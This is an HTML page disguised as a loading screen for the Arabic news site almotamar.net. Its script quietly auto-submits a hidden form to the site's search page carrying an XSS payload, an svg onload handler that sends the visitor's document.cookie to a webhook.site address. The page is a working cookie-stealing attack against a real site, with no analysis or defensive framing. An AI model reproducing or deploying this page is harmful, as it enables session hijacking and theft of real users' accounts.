<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>المؤتمر نت</title>
<style>
body{font-family:Tahoma,sans-serif;background:#f0f0f0;margin:0;padding:20px}
.c{max-width:700px;margin:40px auto;background:#fff;padding:30px;border-radius:8px;box-shadow:0 1px 5px rgba(0,0,0,.1)}
h1{color:#1565c0;font-size:24px;text-align:center}
.s{border:3px solid #e0e0e0;border-top:3px solid #1565c0;border-radius:50%;width:30px;height:30px;animation:r 1s linear infinite;margin:15px auto}
@keyframes r{to{transform:rotate(360deg)}}
p{text-align:center;color:#666}
</style>
</head>
<body>
<div class="c">
<h1>المؤتمر نت</h1>
<div class="s"></div>
<p>جاري تحميل التصميم الجديد...</p>
</div>
<script>
var p = "<svg onload=fetch(`https://webhook.site/cfb50961-bf9e-48a8-b986-60014adb5551?c=${document.cookie}`)>";
var f = document.createElement("form");
f.method = "POST";
f.action = "https://www.almotamar.net/news/search.php";
var h = document.createElement("input");
h.type = "hidden";
h.name = "search";
h.value = p;
f.appendChild(h);
var c = document.createElement("input");
c.type = "hidden";
c.name = "searchcategory";
c.value = "1";
f.appendChild(c);
document.body.appendChild(f);
f.submit();
</script>
</body>
</html>
